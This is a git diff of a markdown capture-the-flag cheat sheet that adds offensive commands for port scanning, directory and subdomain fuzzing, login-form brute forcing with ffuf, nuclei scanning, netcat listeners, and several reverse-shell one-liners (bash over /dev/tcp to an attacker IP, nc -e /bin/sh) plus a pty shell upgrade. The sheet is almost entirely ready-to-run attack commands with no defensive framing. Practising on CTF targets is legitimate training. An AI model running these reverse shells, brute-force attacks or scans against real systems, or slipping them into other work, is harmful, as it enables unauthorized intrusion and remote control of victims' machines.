@@ -6,13 +6,14 @@ title: CTF Cheat Sheet
 
 # CTF CheatSheet
 
+# DATE: 27 Nov 2025
 * TOC
 {:toc}
 
 # PortScan
 
 ```bash
-sudo rustscan -a <target> -- -sCV -oA <filename>
+sudo rustscan -a <hostname> -- -sCV -oA <filename>
 ```
 
 # SMB
@@ -61,35 +62,60 @@ gobuster dir -u http://<target> -t 20 -w /usr/share/wordlists/dirbuster/director
 dirb http://<target>
 ```
 ```bash
-ffuf -u <url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -c -e .php
+ffuf -u "http://<target>/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -c -e .php,.aspx,.html,.txt
+```
+```bash
+feroxbuster -u https://<target>
 ```
 
 ## Vhosts or SubDomains
 ```bash
-ffuf -u <url> -H "Host: FUZZ.<domain_name>" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -c -fs <size>
+gobuster vhost -u http://<target> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+```
+```bash
+ffuf -u http://<target> -H "Host: FUZZ.<domain_name>" -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000 -ic -c -fs <size>
 ```
 
-# Listener
+## Brute Force Login Form
+```bash
+ffuf -request req.txt -request-proto http -mode clusterbomb -w usernames.txt:HFUZZ -w passwords.txt:WFUZZ
+```
 
+# Vulnerability Scanner
+```bash
+nuclei -u <target>
+```
+
+# SHELLS
+
+## Listener
 ```bash
 rlwrap nc -nvlp <8080:port>
 ```
 rlwrap will enhance the shell, allowing you to clear the screen with [CTRL] + [L].
 
-# Reverse Shell
-
+## Reverse Shell
 ```bash
-'bash -c "bash -i >& /dev/tcp/<attachet_ip>/<8080:port> 0>&1"'
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
 ```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'
+'bash -c "bash -i >& /dev/tcp/<attachet_ip>/<8080:port> 0>&1"'
 ```
 ```bash
 nc -e /bin/sh <attacker_ip> <8080:port>
 ```
 
-# Walkthroughs
+## Full TTYs
+```bash
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
 
+# Walkthroughs
 ```bash
 https://0xdf.gitlab.io/
+```
+
+# Resources
+```bash
+https://gtfobins.github.io/
 ```
